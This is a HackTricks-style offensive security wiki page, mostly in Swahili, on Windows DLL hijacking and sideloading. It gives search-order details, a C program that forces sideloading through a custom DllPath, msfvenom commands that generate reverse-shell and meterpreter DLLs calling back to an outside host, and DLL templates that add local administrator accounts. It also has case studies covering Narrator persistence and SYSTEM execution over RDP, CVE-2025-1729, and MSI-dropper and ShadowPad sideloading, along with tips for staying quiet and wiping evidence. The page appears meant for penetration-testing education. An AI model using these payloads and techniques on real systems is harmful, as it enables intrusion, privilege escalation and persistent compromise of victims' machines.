# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Taarifa za Msingi

DLL Hijacking inahusisha kuingilia programu ya kuaminika ili ipakue DLL hasidi. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, and Side-Loading**. Inatumiwa hasa kwa code execution, achieving persistence, na, kwa nadra, privilege escalation. Licha ya mkazo wa escalation hapa, mbinu ya hijacking inabaki ile ile kwa malengo yote.

### Mbinu za Kawaida

Mbinu kadhaa zinatumiwa kwa DLL hijacking, kila moja ikiwa na ufanisi tofauti kulingana na mkakati wa programu wa kupakia DLL:

1. **DLL Replacement**: Kubadilisha DLL halali na moja hasidi, hiari kwa kutumia DLL Proxying ili kuhifadhi utendakazi wa DLL ya awali.
2. **DLL Search Order Hijacking**: Kuweka DLL hasidi katika njia ya utafutaji kabla ya ile halali, ukitumia muundo wa utafutaji wa programu.
3. **Phantom DLL Hijacking**: Kuunda DLL hasidi ambayo programu itapakia ikidhani ni DLL inayohitajika lakini haipo.
4. **DLL Redirection**: Kuibadilisha vigezo vya utafutaji kama `%PATH%` au faili `.exe.manifest` / `.exe.local` kuielekeza programu kwa DLL hasidi.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali kwa moja hasidi katika saraka ya WinSxS, mbinu inayohusiana mara nyingi na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL hasidi katika saraka inayoendeshwa na mtumiaji pamoja na programu iliyokopwa, inayofanana na mbinu za Binary Proxy Execution.

> [!TIP]
> Kwa mnyororo wa hatua kwa hatua unaoweka HTML staging, AES-CTR configs, na .NET implants juu ya DLL sideloading, angalia mchakato hapa chini.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Kupata Dll zilizokosekana

Njia ya kawaida zaidi ya kupata Dll zilizokosekana ndani ya mfumo ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, na **kuweka** **vichujio hivi 2 vifuatavyo**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

na onyesha tu **File System Activity**:

![](<../../../images/image (153).png>)

Ikiwa unatafuta **missing dlls in general** uiruhusu hii iende kwa sekunde chache.\
Ikiwa unatafuta **missing dll** ndani ya executable maalum, unapaswa kuweka chujio nyingine kama **"Process Name" "contains" `<exec name>`, itumikie, na acha kurekodi matukio**.

## Kutumia Dll zilizokosekana

Ili escalate privileges, nafasi bora tuliyonayo ni kuwa tunaweza **kuandika dll ambayo mchakato wa ruhusa atajaribu kuipakia** katika baadhi ya **mahali ambapo itatafutwa**. Kwa hivyo, tunaweza **kuandika** dll katika **folda** ambapo **dll inatafutwa kabla** ya folda ambapo **dll ya asili** iko (hali ya kushangaza), au tunaweza **kuandika kwenye folda fulani ambapo dll itatafutwa** na dll ya asili **haitapatikana** katika folda yoyote.

### Dll Search Order

**Ndani ya** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kuona jinsi Dlls zinavyopakuliwa hasa.**

Programu za Windows zinafuta DLLs kwa kufuata seti ya njia za utafutaji zilizopangwa mapema, zikifuata mfululizo fulani. Tatizo la DLL hijacking linapotokea ni pale DLL hatari inapowekwa kimkakati katika moja ya direktori hizi, kuhakikisha inapakiwa kabla ya DLL halali. Suluhisho la kuzuia hili ni kuhakikisha programu inatumia njia kamili (absolute paths) inaporejea kwa DLL zinazohitajika.

Unaweza kuona mpangilio wa utafutaji wa DLL kwenye mifumo ya 32-bit hapa chini:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Huu ndio mpangilio wa default wa utafutaji ukiwa SafeDllSearchMode umewezeshwa. Unapoizima, direktori ya sasa inaendelea hadi nafasi ya pili. Ili kuzima kipengele hiki, tengeneza value ya registry HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode na uweke 0 (default ni enabled).

Ikiwa [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function inapigwa na **LOAD_WITH_ALTERED_SEARCH_PATH** utafutaji unaanza katika direktori ya module ya executable ambayo **LoadLibraryEx** inapakia.

Mwishowe, kumbuka kwamba **dll inaweza kupakiwa ikielezwa kwa njia kamili badala ya jina peke yake**. Katika kesi hiyo dll hiyo itatafutwa tu katika njia hiyo (ikiwa dll ina dependencies, zitatafutwa kama zilivyopakuliwa kwa jina).

Kuna njia nyingine za kubadilisha mpangilio wa utafutaji lakini sitazi elezea hapa.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya hali ya juu ya kuathiri kwa uhakika njia ya utafutaji ya DLL ya mchakato mpya iliyoundwa ni kuweka uwanja DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda mchakato kwa kutumia native APIs za ntdll. Kwa kutoa directory inayodhibitiwa na mshambuliaji hapa, mchakato lengwa ambao unatatua DLL iliyotajwa kwa jina (bila njia kamili na bila kutumia safe loading flags) unaweza kulazimishwa kupakia DLL hasidi kutoka kwenye directory hiyo.

Wazo kuu
- Jenga process parameters kwa RtlCreateProcessParametersEx na utoe DllPath maalum inayowelekeza kwenye direktori yako inayodhibitiwa (kwa mfano, saraka ambapo dropper/unpacker wako iko).
- Unda mchakato kwa RtlCreateUserProcess. Wakati binary lengwa itapotatua DLL kwa jina, loader itatazama DllPath uliotolewa wakati wa azimio, kuwezesha sideloading ya kuaminika hata wakati DLL hasidi haiko pamoja na EXE lengwa.

Vidokezo/vikwazo
- Hii inaathiri mchakato mwana inayoundwa; ni tofauti na SetDllDirectory, ambayo inaathiri mchakato wa sasa pekee.
- Lengwa lazima aitaje au iite LoadLibrary kwa DLL kwa jina (bila njia kamili na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na njia za absolute zilizowekwa moja kwa moja haziwezi kuibiwa. Forwarded exports na SxS zinaweza kubadilisha utegemezi.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Mfano wa matumizi ya kiutendaji
- Weka xmllite.dll yenye madhara (inayo-export functions zinazohitajika au ikifanya proxy kwa ile halisi) katika saraka yako ya DllPath.
- Anzisha binary iliyosainiwa inayojulikana kutafuta xmllite.dll kwa jina ukitumia mbinu hapo juu. Loader inatatua import kupitia DllPath uliotolewa na inasideload DLL yako.

Mbinu hii imeshuhudiwa katika mazingira halisi kuendesha mnyororo wa sideloading wa hatua nyingi: launcher ya awali hutoa helper DLL, ambayo kisha inazaa binary iliyosainiwa na Microsoft, inayoweza kuhiwabunzwa (hijackable), na yenye DllPath maalum ili kulazimisha upakiaji wa DLL ya mshambuliaji kutoka katika saraka ya staging.

#### Exceptions on dll search order from Windows docs

Taarifa za Microsoft zinaonyesha isitoshi fulani kwa mpangilio wa kawaida wa utafutaji wa DLL:

- Wakati **DLL inayoshirikiana jina na ile tayari iliyopakiwa kwenye kumbukumbu** inakutana, mfumo hupitisha utafutaji wa kawaida. Badala yake, hufanya ukaguzi wa redirection na manifest kabla ya kurudi kwenye DLL iliyopo kwenye kumbukumbu. **Katika tukio hili, mfumo haufanyi utafutaji kwa DLL**.
- Katika matukio ambapo DLL inatambulika kama **Known DLL** kwa toleo la Windows linalotumika, mfumo utatumia toleo lake la Known DLL, pamoja na DLL zote zinazotegemea, **akiwaacha utafutaji**. Funguo ya rejista **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** ina orodha ya Known DLLs hizi.
- Ikiwa **DLL ina utegemezi**, utafutaji wa DLL hizi tegemezi unafanywa kana kwamba zilielezwa kwa jina la **module**, bila kujali kama DLL ya awali ilitambulishwa kwa njia kamili.

### Kupandisha Viwango vya Uruhusu

**Mahitaji**:

- Tambua mchakato unaofanya kazi au utakaofanya kazi chini ya **uruhusa tofauti** (horizontal or lateral movement), ambao **unakosa DLL**.
- Hakikisha **uruhusu wa kuandika** unapatikana kwa **saraka** yoyote ambako **DLL** itatafutwa. Mahali hapa inaweza kuwa saraka ya executable au saraka ndani ya system path.

Ndiyo, masharti ni magumu kuyapata kwa kuwa **kwa chaguo-msingi ni aina ya ajabu kupata executable yenye ruhusa juu iliyokosa DLL** na ni hata **ajabu zaidi kuwa na ruhusa za kuandika kwenye folda ya system path** (kwa kawaida huwezi). Lakini, katika mazingira yaliyopangwa vibaya hili linawezekana.\
Iwapo una bahati na unakutana na mahitaji hayo, unaweza kuangalia mradi wa [UACME](https://github.com/hfiref0x/UACME). Hata kama **lengo kuu la mradi ni kupitisha UAC**, unaweza kupata huko **PoC** ya Dll hijaking kwa toleo la Windows unaloweza kutumia (labda kwa kubadilisha tu njia ya folda ambako una ruhusa za kuandika).

Kumbuka kwamba unaweza **kuangalia ruhusa zako katika saraka** kwa kufanya:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Na **angalia ruhusa za saraka zote ndani ya PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Unaweza pia kuangalia imports za executable na exports za dll kwa:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Kwa mwongozo kamili juu ya jinsi ya **abuse Dll Hijacking to escalate privileges** ukiwa na ruhusa za kuandika katika **System Path folder**, angalia:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zana za kiotomatiki

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) itatafuta ikiwa una ruhusa za kuandika kwenye folda yoyote ndani ya system PATH.\
Zana nyingine za kiotomatiki za kuvutia za kugundua udhaifu huu ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll_.

### Mfano

Ikiwa utapata senario inayoweza kutumiwa, mojawapo ya mambo muhimu zaidi ya kufanikiwa kuutiliza ni **create a dll that exports at least all the functions the executable will import from it**. Hata hivyo, kumbuka kwamba Dll Hijacking ni zana muhimu ili [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **how to create a valid dll** ndani ya utafiti huu wa dll hijacking uliolenga dll hijacking kwa ajili ya execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **next sectio**n unaweza kupata baadhi ya **basic dll codes** ambazo zinaweza kuwa muhimu kama **templates** au kuunda **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Kwa msingi, **Dll proxy** ni Dll inayoweza kutekeleza code yako ya uharibifu wakati inapopelekwa (loaded) lakini pia kufichua na kufanya kazi kama ilivyotarajiwa kwa kupeleka maombi yote (relaying all the calls) kwenye maktaba halisi.

Kwa kutumia zana za [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus) unaweza kuonyesha executable na kuchagua maktaba unayotaka proxify na kuzalisha proxified dll, au kuonyesha Dll na kuzalisha proxified dll.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Pata meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Unda mtumiaji (x86, sikumuona toleo la x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Yako mwenyewe

Tambua kwamba katika visa kadhaa Dll unazotengeneza lazima ziweze **export several functions** ambazo zitatumika na victim process; ikiwa functions hizi hazipo, **binary won't be able to load** na **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL mfano na uundaji wa mtumiaji</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>C DLL Mbadala yenye thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Somo la Kesi: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe bado inachunguza DLL ya localization inayoweza kutabirika na maalum kwa lugha wakati wa kuanza ambayo inaweza ku-hijacked kwa ajili ya arbitrary code execution na persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

DLL ya chini kabisa
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Hijack ya kimsingi itataja/itaangazia UI. Ili kubaki kimya, on attach orodhesha threads za Narrator, fungua thread kuu (`OpenThread(THREAD_SUSPEND_RESUME)`) na `SuspendThread` ili; endelea katika thread yako mwenyewe. Angalia PoC kwa msimbo kamili.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa hayo hapo juu, kuanzisha Narrator huchoma DLL iliyopandwa. Katika secure desktop (logon screen), bonyeza CTRL+WIN+ENTER kuanzisha Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Fanya RDP kwenye host, kwenye logon screen bonyeza CTRL+WIN+ENTER kuanzisha Narrator; DLL yako itaendeshwa kama SYSTEM kwenye secure desktop.
- Utekelezaji unasimama wakati kikao cha RDP kinapofungwa—ingiza/hamisha haraka.

Bring Your Own Accessibility (BYOA)
- Unaweza kunakili registry entry ya built-in Accessibility Tool (AT) (mfano, CursorIndicator), uibadilishe ili iendeleze kwa binary/DLL yoyote, uirudishe (import), kisha weka `configuration` kwa jina la AT hiyo. Hii inaruhusu utekelezaji wowote kupitia mfumo wa Accessibility.

Notes
- Kuandika chini ya `%windir%\System32` na kubadilisha thamani za HKLM kunahitaji haki za admin.
- Mantiki yote ya payload inaweza kuishi katika `DLL_PROCESS_ATTACH`; hakuna exports zinazohitajika.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Somo hili linaonyesha **Phantom DLL Hijacking** katika Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), iliyosajiliwa kama **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` iliyopo katika `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` inafanya kazi kila siku saa 9:30 AM chini ya muktadha wa mtumiaji aliyesajiliwa.
- **Directory Permissions**: Inaundelevu kuwa Writable by `CREATOR OWNER`, ikiruhusu watumiaji wa ndani kuacha mafaili yoyote.
- **DLL Search Behavior**: Inajaribu kupakia `hostfxr.dll` kutoka directory yake ya kazi kwanza na inarekodi "NAME NOT FOUND" ikiwa haipo, ikionyesha upendeleo wa kutafuta kwenye directory ya ndani.

### Exploit Implementation

Mshambuliaji anaweza kuweka stub ya `hostfxr.dll` yenye madhara katika directory hiyo hiyo, akitumia DLL iliyokosekana kupata utekelezaji wa msimbo chini ya muktadha wa mtumiaji:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Mtiririko wa Shambulio

1. Kama mtumiaji wa kawaida, weka `hostfxr.dll` ndani ya `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri kazi iliyopangwa ifanye kazi saa 9:30 AM chini ya muktadha wa mtumiaji wa sasa.
3. Ikiwa msimamizi ameingia wakati kazi inatekelezwa, DLL yenye madhara itaendesha katika kikao cha msimamizi kwa medium integrity.
4. Unganisha mbinu za kawaida za UAC bypass ili kuinua kutoka medium integrity hadi vibali vya SYSTEM.

## Somo la Kesi: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Waovaji wa vitisho mara nyingi huambatanisha MSI-based droppers na DLL side-loading ili kutekeleza payload chini ya mchakato uliothibitishwa na uliosainiwa.

Muhtasari wa mnyororo
- Mtumiaji anapakua MSI. CustomAction inafanya kazi kimya wakati wa ufungaji wa GUI (kwa mfano, LaunchApplication au vitendo vya VBScript), ikirekebisha awamu inayofuata kutoka kwa rasilimali zilizojumuishwa.
- Dropper inaandika EXE halali, iliyotiwa saini na DLL yenye madhara kwenye saraka hiyo hiyo (mfano: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Unapoanza EXE iliyosainiwa, mpangilio wa utafutaji wa DLL wa Windows huipakia wsc.dll kutoka kwenye saraka ya kazi kwanza, ikitekeleza msimbo wa mshambulizi chini ya mzazi aliyesainiwa (ATT&CK T1574.001).

Uchambuzi wa MSI (vitu vya kuangalia)
- Jedwali la CustomAction:
- Tafuta vipengele vinavyoendesha programu zinazotekelezwa au VBScript. Mfano wa muundo unaoshuku: LaunchApplication inayotekeleza faili iliyojumuishwa kwa siri (background).
- Katika Orca (Microsoft Orca.exe), angalia jedwali la CustomAction, InstallExecuteSequence na Binary.
- Payload zilizojumuishwa/ zilizogawanywa ndani ya MSI CAB:
- Kutoa kwa msimamizi: msiexec /a package.msi /qb TARGETDIR=C:\out
- Au tumia lessmsi: lessmsi x package.msi C:\out
- Tafuta vipande vingi vidogo vinavyounganishwa na kufunguliwa (decrypted) na CustomAction ya VBScript. Mtiririko wa kawaida:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Weka faili hizi mbili katika folda moja:
- wsc_proxy.exe: host halali uliosainiwa (Avast). Mchakato unajaribu kupakia wsc.dll kwa jina kutoka kwenye saraka yake.
- wsc.dll: attacker DLL. Ikiwa hakuna exports maalum zinazohitajika, DllMain inaweza kutosha; vinginevyo, jenga proxy DLL na peleka exports zinazohitajika kwa maktaba halisi wakati ukikimbiza payload ndani ya DllMain.
- Jenga payload ndogo ya DLL:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Kwa mahitaji ya export, tumia framework ya proxy (mfano, DLLirant/Spartacus) ili kutengeneza DLL ya forwarding ambayo pia inatekeleza payload yako.

- Mbinu hii inategemea utatuzi wa majina ya DLL na binary ya host. Ikiwa host inatumia absolute paths au safe loading flags (mfano, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack inaweza kushindikana.
- KnownDLLs, SxS, na forwarded exports zinaweza kuathiri kipaumbele na lazima zizingatiwe wakati wa kuchagua host binary na export set.

## Triadi zilizotiwa saini + payload zilizofichwa (ShadowPad case study)

Check Point ilielezea jinsi Ink Dragon inavyopeleka ShadowPad kwa kutumia **triadi ya faili tatu** ili kujificha ndani ya programu halali huku ikihifadhi payload ya msingi iliyofichwa kwenye diski:

1. **EXE ya mwenyeji iliyosainiwa** – wauzaji kama AMD, Realtek, au NVIDIA wanatumika vibaya (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Wavamizi wanabadilisha jina la executable ili ionekane kama binary ya Windows (kwa mfano `conhost.exe`), lakini saini ya Authenticode inabaki halali.
2. **DLL ya loader yenye madhara** – imewekwa kando ya EXE kwa jina linalotarajiwa (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL hiyo kawaida ni binary ya MFC iliyofichwa kwa kutumia ScatterBrain framework; kazi yake pekee ni kupata blob iliyofichwa, kuidecrypt, na kuifanya reflectively map ShadowPad.
3. **Encrypted payload blob** – mara nyingi huhifadhiwa kama `<name>.tmp` katika saraka ileile. Baada ya memory-mapping payload iliyodecryptwa, loader inafuta faili la TMP kuvuruga ushahidi wa forensiki.

Tradecraft notes:

* Kubadilisha jina la EXE iliyosainiwa (wakati ukiweka OriginalFileName asili katika header ya PE) kumruhusu kujifanya kama binary ya Windows lakini ikahifadhi saini ya muuzaji, hivyo rudi tabia ya Ink Dragon ya kuacha binaries zinazoonekana kama `conhost.exe` ambazo kwa kweli ni utilities za AMD/NVIDIA.
* Kwa sababu executable inabaki kuaminika, controls nyingi za allowlisting zinahitaji tu DLL yako yenye madhara iwe kando yake. Lenga kubinafsisha loader DLL; parent iliyosainiwa kwa kawaida inaweza kukimbia bila kubadilishwa.
* Decryptor ya ShadowPad inatarajia blob la TMP liwe kando ya loader na liwe linayosomwa/kuandikwa ili liweze kufutwa (zero) faili baada ya mapping. Weka saraka iwe inayoweza kuandikwa hadi payload itakapopakiwa; mara ikija kwenye memory faili la TMP linaweza kufutwa kwa usalama kwa ajili ya OPSEC.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)


{{#include ../../../banners/hacktricks-training.md}}
